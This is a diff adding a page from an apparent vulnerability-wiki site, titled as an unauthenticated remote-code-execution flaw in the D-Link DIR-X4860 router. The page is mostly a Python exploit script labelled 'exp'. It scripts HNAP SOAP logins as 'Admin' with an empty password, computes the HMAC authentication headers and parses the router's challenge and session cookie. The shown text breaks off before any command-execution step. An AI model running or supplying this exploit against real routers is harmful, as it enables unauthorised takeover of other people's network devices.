@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/D-Link/D-LINK-DIR-X4860%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>D LINK DIR X4860未授权RCE漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "D-LINK-DIR-X4860\u672a\u6388\u6743RCE\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "exp", url: "#exp", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../D-LINK-Go-RT-AC750%20GORTAC750_A1_FW_v101b03%E5%AD%98%E5%9C%A8%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%28CVE-2024-22853%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../D-LINK-Go-RT-AC750%20GORTAC750_A1_FW_v101b03%E5%AD%98%E5%9C%A8%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%28CVE-2024-22853%29/" class="btn btn-xs btn-link">
+        D LINK Go RT AC750 GORTAC750 A1 FW v101b03存在硬编码漏洞(CVE 2024 22853)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../D-LINK-DIR-845L%E6%8E%A5%E5%8F%A3bsc_sms_inbox.php%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../D-LINK-DIR-845L%E6%8E%A5%E5%8F%A3bsc_sms_inbox.php%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        D LINK DIR 845L接口bsc sms inbox.php存在信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="d-link-dir-x4860rce">D-LINK-DIR-X4860未授权RCE漏洞<a class="headerlink" href="#d-link-dir-x4860rce" title="Permanent link">&para;</a></h2>
+<h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">hashlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">sha256</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">math</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib3.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+<span class="c1"># Suppress only the single warning from urllib3 needed.</span>
+<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">category</span><span class="o">=</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+<span class="c1"># You must initialize logging, otherwise you&#39;ll not see debug output.</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">()</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">()</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
+<span class="n">requests_log</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s2">&quot;requests.packages.urllib3&quot;</span><span class="p">)</span>
+<span class="n">requests_log</span><span class="o">.</span><span class="n">propagate</span> <span class="o">=</span> <span class="kc">True</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_sha256</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; get_sha256 &quot;&quot;&quot;</span>
+    <span class="n">hsobj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
+    <span class="n">hsobj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">hsobj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_key_hashlib_sha256</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_key_hashlib_sha256&quot;&quot;&quot;</span>
+    <span class="n">hsobj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span>
+    <span class="n">hsobj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">hsobj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_hmac_hashlib_sha256</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_hmac_hashlib_sha256&quot;&quot;&quot;</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_hmac_key_hashlib_sha256</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_hmac_key_hashlib_sha256&quot;&quot;&quot;</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span>
+        <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">),</span> <span class="n">message</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span>
+        <span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+    <span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_base64_hmac_sha256</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_base64_hmac_sha256&quot;&quot;&quot;</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+    <span class="n">sign</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+    <span class="n">base64sha256</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sign</span><span class="p">,</span> <span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">base64sha256</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_md5</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_md5&quot;&quot;&quot;</span>
+    <span class="n">hsobj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+    <span class="n">hsobj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">hsobj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_key_md5</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_key_md5&quot;&quot;&quot;</span>
+    <span class="n">hsobj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span>
+    <span class="n">hsobj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">hsobj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_hmac_key_md5</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_hmac_key_md5&quot;&quot;&quot;</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span>
+        <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">),</span> <span class="n">message</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span>
+        <span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+    <span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_hmac_md5</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_hmac_md5&quot;&quot;&quot;</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">send_http</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;send_http&quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">https</span> <span class="ow">is</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">https</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">https</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="n">url</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;http</span><span class="si">{</span><span class="n">https</span><span class="si">}</span><span class="s2">://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/HNAP1/&quot;</span><span class="p">,</span>
+        <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+        <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">res_text</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;res_text</span><span class="se">\n</span><span class="s2">===</span><span class="se">\n</span><span class="si">{</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="se">\n</span><span class="s2">===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">challenge</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">if</span> <span class="s2">&quot;&lt;Challenge&gt;&quot;</span> <span class="ow">in</span> <span class="n">res_text</span><span class="p">:</span>
+        <span class="n">usb_adv_cgi_id</span> <span class="o">=</span> <span class="n">res_text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;Challenge&gt;&quot;</span><span class="p">)</span>
+        <span class="n">id_value</span> <span class="o">=</span> <span class="n">usb_adv_cgi_id</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;/Challenge&gt;&quot;</span><span class="p">)</span>
+        <span class="n">challenge</span> <span class="o">=</span> <span class="n">id_value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Challenge = </span><span class="si">{</span><span class="n">challenge</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">if</span> <span class="s2">&quot;&lt;Cookie&gt;&quot;</span> <span class="ow">in</span> <span class="n">res_text</span><span class="p">:</span>
+        <span class="n">usb_adv_cgi_id</span> <span class="o">=</span> <span class="n">res_text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;Cookie&gt;&quot;</span><span class="p">)</span>
+        <span class="n">id_value</span> <span class="o">=</span> <span class="n">usb_adv_cgi_id</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;/Cookie&gt;&quot;</span><span class="p">)</span>
+        <span class="n">cookie</span> <span class="o">=</span> <span class="n">id_value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Cookie = </span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">public_key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">if</span> <span class="s2">&quot;&lt;PublicKey&gt;&quot;</span> <span class="ow">in</span> <span class="n">res_text</span><span class="p">:</span>
+        <span class="n">usb_adv_cgi_id</span> <span class="o">=</span> <span class="n">res_text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;PublicKey&gt;&quot;</span><span class="p">)</span>
+        <span class="n">id_value</span> <span class="o">=</span> <span class="n">usb_adv_cgi_id</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;/PublicKey&gt;&quot;</span><span class="p">)</span>
+        <span class="n">public_key</span> <span class="o">=</span> <span class="n">id_value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] PublicKey = </span><span class="si">{</span><span class="n">public_key</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;&lt;LoginResult&gt;&quot;</span> <span class="ow">in</span> <span class="n">res_text</span><span class="p">:</span>
+        <span class="n">usb_adv_cgi_id</span> <span class="o">=</span> <span class="n">res_text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;LoginResult&gt;&quot;</span><span class="p">)</span>
+        <span class="n">id_value</span> <span class="o">=</span> <span class="n">usb_adv_cgi_id</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&lt;/LoginResult&gt;&quot;</span><span class="p">)</span>
+        <span class="n">login_result</span> <span class="o">=</span> <span class="n">id_value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] LoginResult = </span><span class="si">{</span><span class="n">login_result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">challenge</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">res_text</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">login_request</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;login_result&quot;&quot;&quot;</span>
+    <span class="n">xml_post</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="s2">&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span>
+<span class="s2">    &lt;soap:Body&gt;</span>
+<span class="s2">        &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;</span>
+<span class="s2">            &lt;Action&gt;request&lt;/Action&gt;</span>
+<span class="s2">            &lt;Username&gt;Admin&lt;/Username&gt;</span>
+<span class="s2">            &lt;PrivateLogin&gt;Username&lt;/PrivateLogin&gt;</span>
+<span class="s2">            &lt;login_password&gt;&lt;/login_password&gt;</span>
+<span class="s2">            &lt;Captcha&gt;&lt;/Captcha&gt;</span>
+<span class="s2">        &lt;/Login&gt;</span>
+<span class="s2">    &lt;/soap:Body&gt;</span>
+<span class="s2">&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="n">ip</span><span class="p">,</span>
+        <span class="s2">&quot;X-Requested-With&quot;</span><span class="p">:</span> <span class="s2">&quot;XMLHttpRequest&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;SOAPAction&quot;</span><span class="p">:</span> <span class="s1">&#39;&quot;http://purenetworks.com/HNAP1/Login&quot;&#39;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;text/xml; charset=UTF-8&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">challenge</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">send_http</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">xml_post</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">challenge</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] get Challenge error&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">challenge</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">public_key</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">login_login</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">login_password</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;login_login&quot;&quot;&quot;</span>
+    <span class="n">xml_post</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="s2">&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span>
+<span class="s2">    &lt;soap:Body&gt;</span>
+<span class="s2">        &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;</span>
+<span class="s2">            &lt;Action&gt;login&lt;/Action&gt;</span>
+<span class="s2">            &lt;Username&gt;Admin&lt;/Username&gt;</span>
+<span class="s2">            &lt;LoginPassword&gt;</span><span class="si">{</span><span class="n">login_password</span><span class="si">}</span><span class="s2">&lt;/LoginPassword&gt;</span>
+<span class="s2">            &lt;Captcha&gt;&lt;/Captcha&gt;</span>
+<span class="s2">        &lt;/Login&gt;</span>
+<span class="s2">    &lt;/soap:Body&gt;</span>
+<span class="s2">&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="n">ip</span><span class="p">,</span>
+        <span class="s2">&quot;X-Requested-With&quot;</span><span class="p">:</span> <span class="s2">&quot;XMLHttpRequest&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;HNAP_AUTH&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">hnap_auth</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">time_now</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;SOAPAction&quot;</span><span class="p">:</span> <span class="s1">&#39;&quot;http://purenetworks.com/HNAP1/Login&quot;&#39;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;text/xml; charset=UTF-8&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;uid=</span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">send_http</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">xml_post</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_internet_conn_up_time</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">hnap_auth</span><span class="p">,</span> <span class="n">time_now</span><span class="p">,</span> <span class="n">cookie</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;get_internet_conn_up_time&quot;&quot;&quot;</span>
+    <span class="n">xml_post</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="s2">&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span>
+<span class="s2">    &lt;soap:Body&gt;</span>
+<span class="s2">        &lt;GetInternetConnUpTime xmlns=&quot;http://purenetworks.com/HNAP1/&quot; /&gt;</span>
+<span class="s2">    &lt;/soap:Body&gt;</span>
+<span class="s2">&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="n">ip</span><span class="p">,</span>
+        <span class="s2">&quot;X-Requested-With&quot;</span><span class="p">:</span> <span class="s2">&quot;XMLHttpRequest&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;HNAP_AUTH&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">hnap_auth</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">time_now</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;SOAPAction&quot;</span><span class="p">:</span> <span class="s1">&#39;&quot;http://purenetworks.com/HNAP1/GetInternetConnUpTime&quot;&#39;</span><span class="p">,</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;text/xml; charset=UTF-8&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;uid=</span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">res_text</span> <span class="o">=</span> <span class="n">send_http</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">https</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">xml_post</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res_text</span>
